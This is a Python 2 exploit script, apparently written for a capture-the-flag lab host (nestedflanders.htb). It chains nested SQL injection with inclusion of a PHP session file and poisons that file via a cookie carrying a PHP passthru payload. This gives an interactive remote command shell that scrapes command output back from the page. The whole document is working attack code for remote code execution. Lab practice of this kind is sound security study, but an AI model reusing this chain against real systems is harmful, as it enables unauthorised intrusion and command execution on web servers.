import requests
import json
import random
import hashlib
import binascii
import sys
import re
import urllib3
import time

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

START_OFFSET = "Fun|s:^[0-]{2}$:\""
END_OFFSET = "\";<!--"
phpsessid = "";

def make_request_initial(command):
    headers = {
        'User-Agent': 'curl/7.64.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate'
    }

    s = requests.session()
    s.keep_alive = False

    url = "https://www.nestedflanders.htb/index.php?id=587\'%%20UNION%%20SELECT%%20\"\'%%20UNION%%20SELECT%%20\'/var/lib/php/sessions/sess_%s\';--%%20\";--%%20" % phpsessid
    cookie = {'PHPSESSID': '%s; Fun=<?php passthru(\'%s\')?>;' % (phpsessid, command)}

    try:
        r = s.get(url, headers=headers, cookies=cookie, verify=False)
    except:
        return 1

    return 0

def make_request(command):
    headers = {
        'User-Agent': 'curl/7.64.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate'
    }

# Host: www.nestedflanders.htb
# Connection: close
# Upgrade-Insecure-Requests: 1

    s = requests.session()
    s.keep_alive = False

    url = "https://www.nestedflanders.htb/index.php?id=587\'%%20UNION%%20SELECT%%20\"\'%%20UNION%%20SELECT%%20\'/var/lib/php/sessions/sess_%s\';--%%20\";--%%20" % phpsessid
    cookie = {'PHPSESSID': '%s; Fun=<?php passthru(\'%s\')?>;' % (phpsessid, command)}

    try:
        r = s.get(url, headers=headers, cookies=cookie, verify=False)
    except:
        print r
        return None

    try:
    #    start_offset = str(r.text).find(START_OFFSET) + len(START_OFFSET)
        start_offset = re.search(START_OFFSET, str(r.text)).start() + 10
        end_offset = str(r.text).find(END_OFFSET)
    except:
        print "Error: Unable to find start/end offsets, got response: %s" % r
        print "(Debug) HTML text: %s" % r.text
        return None

#    print("%d %d" % (start_offset, end_offset))

    command_result = str(r.text)[start_offset:end_offset]

    return command_result

if(int(len(sys.argv)) < 2):
    print("Usage: %s <PHPSESSID>" % sys.argv[0])

    sys.exit(1)

phpsessid = sys.argv[1]

while True:
    command = raw_input("(pseudo terminal)$ ")

    if(make_request_initial(command) == 1):
        print("Error: Unknown error.")
        continue
    r = make_request(command)
    if(r == None):
        continue
    sys.stdout.write(".")
    sys.stdout.flush()
    r = make_request(command)
    if(r == None):
        continue
    sys.stdout.write(".")
    sys.stdout.flush()
    r = make_request(command)
    if(r == None):
        continue
    sys.stdout.write(".")
    time.sleep(1)
    sys.stdout.flush()
    r = make_request(command)
    if(r == None):
        continue
    sys.stdout.write(".")
    time.sleep(1)
    sys.stdout.write("\n")
    r = make_request(command)
    if(r == None):
        continue

    print r
